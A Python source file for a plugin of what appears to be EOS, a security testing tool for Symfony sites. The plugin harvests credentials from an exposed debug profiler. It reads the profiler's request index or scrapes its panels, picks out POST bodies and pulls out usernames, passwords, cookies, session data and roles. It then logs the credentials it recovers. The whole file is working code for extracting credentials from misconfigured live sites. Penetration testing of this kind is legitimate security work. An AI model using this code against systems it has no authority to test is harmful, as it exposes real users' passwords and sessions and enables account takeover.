"""Request logs EOS plugin."""

import re
import csv
from io import StringIO
from pathlib import Path
from datetime import datetime
from urllib.parse import parse_qs

from requests import Request

from eos.plugins import AbstractPlugin


class User:

    def __init__(self, name=None, password=None, role=None, cookies=None, session=None, token=None):
        """
        Initialization.

        :param name: user name
        :param password: user password
        :param role: user role
        :param cookies: cookies
        :param session: user session
        """

        self.name = name or ''
        self.password = password or ''
        self.role = role or ''
        self.cookies = cookies or {}
        self.session = session
        self.token = token

    def __str__(self):
        password = f':{self.password}' if self.password else ''
        role = f' [{self.role}]' if self.role else ''
        cookies = '; '.join('='.join((key, value)) for key, value in self.cookies.items())
        cookies = f' (cookies: {cookies})' if self.cookies else ''
        session = f' (session: {"yes" if self.session else "no"})'
        return f'{self.name}{password}{role}{cookies}{session}'

    def __hash__(self):
        return hash(self.name + ':' + self.password)

    def __eq__(self, other):
        return hash(self) == hash(other)

    def __lt__(self, other):
        return self.name < other.name


class Plugin(AbstractPlugin):
    """
    Request logs EOS plugin.

    Look for credentials or sensitive info in request logs.
    This info is provided by the profiler request logs.
    This plugin uses the var/cache/<env>/profiler/index.csv file to retrieve all request logs.
    The lookup is performed on POST requests only, looking for body parameters containing specific keywords
    (defined in Plugin.usernames and Plugin.passwords).

    Note: if the profiler/index.csv file cannot be retrieved, the lookup is performed directly on the profiler panel by
    parsing the HTML.
    """

    name = 'Request logs'
    _cache = 'profiler/index.csv'

    usernames = ['user', 'login', 'usr', 'email']
    """List of possible username parameter keys."""
    passwords = ['pass']
    """List of possible password parameter keys."""
    limit = 50
    """Limit results to the first POST requests if the retrieval of profiler/index.csv failed."""

    def run(self):
        """
        Get request logs from profiler.

        1. Fetch all tokens and associated info (URL, method) using either profiler/index.csv or the profiler panel.
        2. Enqueue the associated URL to retrieve requests info
        3. Extract credentials, sessions and cookies
        """

        # Get list of POST requests
        index = self.symfony.profiler.open(self.cache)
        if index is not None:
            self.symfony.files[self.cache] = index
            rows = csv.reader(StringIO(index))
            logs = list(row for row in rows if row and row[2] == 'POST')
        else:
            logs = self.list(self.limit)

        # No POST requests
        if not logs:
            self.log.info('No POST requests')
            return

        # Enqueue to engine for fetching
        self.log.info('Found %d POST requests', len(logs))
        for token, ip, method, url, time, _, status in logs:
            request = Request(method='GET', url=self.symfony.profiler.url(token), params={'panel': 'request'})
            request.token = token
            self.engine.queue.put(request)

        # Wait for the engine
        self.engine.join()

        # Analyse requests
        users = set()
        for response in self.engine.results:
            soup = self.parse(response.text)
            parameters = self.extract_raw_body(soup)
            cookies = self.extract_cookies(soup)
            session = self.extract_session(soup)
            role = None
            if session:
                role = self.extract_role(session)
            username = self.query(parameters, self.usernames)
            password = self.query(parameters, self.passwords)

            if username is not None:
                user = User(username, password, role, cookies, session, response.request.token)
                users.add(user)
                self.log.debug('[%s] Found user: %s', user.token, user)

        if not users:
            self.log.warning('Did not find any credentials')
            return

        # Valid sessions
        users_with_session = sorted(user for user in users if user.name and user.password and user.session)
        if users_with_session:
            self.log.warning('Found the following credentials with a valid session:')
            for user in users_with_session:
                self.log.warning('  %s: %s [%s]', user.name, user.password, user.role)

        # Lonely passwords (password change)
        lonely_passwords = sorted(user for user in users if user.password and not user.name)
        if lonely_passwords:
            self.log.warning('Found the following lonely credentials:')
            for user in lonely_passwords:
                self.log.warning('  %s', user.password)

        # Failed attempts (?)
        users_without_session = sorted(user for user in users if user.name and not user.session)
        if users_without_session:
            self.log.warning('Found the following credentials with no valid session:')
            for user in users_without_session:
                self.log.warning('  %s: %s', user.name, user.password)

    @property
    def cache(self):
        return str(Path(self.symfony.cache, self._cache))

    def list(self, limit, method='POST'):
        """
        Get the requests list.

        Get the list of logged requests from the profiler.
        Each entry contains the request's status, source IP address, method, url, time and token.
        Time is a datetime from format %d-%b-%Y\n%H:%M:%S (ex: 06-Dec-2019\n23:02:43)
        Results tuples are order according to the order in the profile/index.csv log file.

        :param limit: limit list size
        :param method: filter list by method
        :return: list of tuples (token, ip, method, url, time, None, status)
        """

        # Get list
        params = {'limit': limit, 'method': method}
        r = self.symfony.profiler.get('empty/search/results', params=params)
        soup = self.parse(r.text)

        # No results
        if soup.find('h2', string='No results found'):
            return []

        # Parse requests list
        table = soup.find('table', id='search-results')
        entries = table.find('tbody').find_all('tr')
        results = []
        for entry in entries:
            elements = entry.find_all('td')
            status, ip, method, url, time, token = list(elm.text.strip() for elm in elements)
            time = datetime.strptime(time, '%d-%b-%Y\n%H:%M:%S')
            results.append((token, ip, method, url, time, None, status))

        return results

    @staticmethod
    def query(parameters, match):
        """
        Find potential parameters matching a list of candidates.

        Used to extract usernames and passwords from queries without knowing the parameter names.
        Match contains the list of candidate. To be valid, a candidate must be a part of the parameter key.
        Ex: _usr_login will match on both usr and login.
        Only the first match is returned.

        :param parameters: query parameters dict
        :param match: list of candidates
        :return: the value of the first matching key or None
        """

        for key, value in parameters.items():
            if any(candidate for candidate in match if candidate in key.lower()):
                return value

    @staticmethod
    def extract_raw_body(soup):
        """
        Extract the raw request content part of the profiler view.

        :param soup: the soup to parse
        :return: dict of request parameters
        """

        title = soup.find('h3', string='Request Content')
        content = title.find_next('pre').text.strip()

        # Sanitation
        raw = parse_qs(content)
        parameters = {}
        for key, values in raw.items():
            parameters[key.strip()] = ', '.join(value.strip() for value in values)

        return parameters

    @staticmethod
    def extract_cookies(soup):
        """Extract cookies from a request panel."""

        try:
            title = soup.find('h3', string='Request Cookies')
            table = title.find_next('tbody')

            cookies = {}
            for tr in table.find_all('tr'):
                key = tr.find('th').text
                value = tr.find('td').find('span').text
                cookies[key] = value

            return cookies

        except:
            return []

    @staticmethod
    def extract_session(soup):
        """Extract session info from a request panel."""

        try:
            title = soup.find('h3', string='Session Attributes')
            table = title.find_next('tbody')

            for tr in table.find_all('tr'):
                key = tr.find('th').text
                value = tr.find('td').find('span').text
                if key == '_security_main':
                    return value

        except:
            pass

    @staticmethod
    def extract_role(session):
        """
        Extract a user's role from its serialized session.

        From: https://symfony.com/doc/current/security.html#roles
        [...] every user is always given at least one role: ROLE_USER
        Every role must start with ROLE_ (otherwise, things won't work as expected)
        Other than the above rule, a role is just a string and you can invent what you need (e.g. ROLE_PRODUCT_ADMIN).

        A quick and dirty solution is a regex matching ROLE_* to the end of the quoted string.

        :param session: serialized session
        :return:
        """

        regex = re.compile('ROLE_[^"\']+')
        match = regex.search(session)
        return match.group()
